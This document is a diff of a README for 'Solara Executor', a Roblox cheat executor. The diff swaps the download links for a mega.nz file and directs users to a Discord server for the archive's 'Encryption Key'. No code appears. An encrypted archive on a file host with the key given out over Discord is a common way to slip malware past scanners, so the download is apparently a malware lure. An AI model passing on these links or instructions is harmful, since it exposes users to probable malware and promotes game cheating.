@@ -2,12 +2,12 @@
 Solara Download
 
 # **Check the discord for the Encryption Key**
-# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/rFIyRZBa)
+# Solara Executor [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/3RQgHBxb)
  
 
 ## Installation
 To install Solara Executor, follow these simple steps:
-1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/rFIyRZBa)
+1. [![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://mega.nz/file/3RQgHBxb)
 
 2. **Encryption Key can be found in the [Discord](https://discord.gg/VbGQybjvRe)**
   
@@ -52,7 +52,7 @@ Remember, although we can vouch these downloads are safe, there is never a 100% 
 ## Contributing
 We actively encourage contributions from the Roblox community to help us improve Solara Executor. Whether you have suggestions, bug reports, or wish to contribute directly to the development of Solara Executor for Roblox, we welcome your input. Feel free to submit a pull request—your involvement is essential in making Solara Executor even better for all Roblox users!
 
-[![361017071-00b6407a-f962-452d-a474-14962df4fbc7](https://github.com/user-attachments/assets/76cdd4f7-352a-496f-8d64-35dd8b37a17e)](https://github.com/user-attachments/files/16762967/Solara.zip)
+[![361017071-00b6407a-f962-452d-a474-14962df4fbc7](https://github.com/user-attachments/assets/76cdd4f7-352a-496f-8d64-35dd8b37a17e)](https://mega.nz/file/3RQgHBxb)
 
 
 ## License
